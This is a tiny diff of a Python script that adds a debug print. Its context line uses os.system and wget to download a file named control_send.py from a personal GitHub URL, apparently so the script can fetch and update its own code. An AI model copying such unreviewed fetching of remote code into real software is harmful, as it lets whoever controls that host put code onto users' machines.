@@ -1,5 +1,6 @@
 import os
 import requests
+print("a")
 import subprocess
 os.system("wget -O new.py https://raw.githubusercontent.com/jonathanbreitg/dump/main/control_send.py")
 import filecmp
